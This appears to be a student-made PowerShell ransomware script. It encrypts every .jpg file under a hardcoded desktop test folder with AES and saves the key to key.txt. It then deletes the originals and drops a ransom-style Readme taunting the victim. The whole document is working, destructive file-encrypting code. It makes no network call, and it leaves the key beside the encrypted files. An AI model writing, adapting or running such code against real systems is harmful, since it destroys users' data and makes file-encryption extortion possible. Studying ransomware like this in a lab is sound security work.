$path = "C:\Users\slisi\Desktop\test_folder"
$list_of_files = @()
if(Test-Path -Path $path) {
    $list_of_files += Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue -Filter *.jpg -Name
    $crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create('AES')
    $crypto.GenerateKey()
    $key_plain = [System.Convert]::ToBase64String($crypto.Key)
    New-Item -Path C:\Users\slisi\Desktop\test_folder -Name "key.txt" -ItemType "file" -Value $key_plain

    ForEach($file in $list_of_files){
        $file_path = $path + "\" + $file
        $encryptet_file_path = $file_path + ".encrypted"
        $reader = New-Object System.IO.FileStream($file_path, [System.IO.FileMode]::Open)
        $writer = New-Object System.IO.FileStream($encryptet_file_path, [System.IO.FileMode]::Create)
        
        $crypto.GenerateIV()
        $writer.Write([System.BitConverter]::GetBytes($crypto.IV.Length), 0, 4)
        $writer.Write($crypto.IV, 0, $crypto.IV.Length)

        $encryptor = $crypto.CreateEncryptor()
        $crypto_stream = New-Object System.Security.Cryptography.CryptoStream($writer, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $reader.CopyTo($crypto_stream)
        $crypto_stream.FlushFinalBlock()
        $crypto_stream.Close()
        $reader.Close()
        $writer.Close()
        Remove-Item -LiteralPath $file_path
    }
	
	New-Item -Path $path -Name "Readme.txt" -ItemType "file" -Value "All your jpg files were encrypted. Next time be more careful :) SLI0095"
}
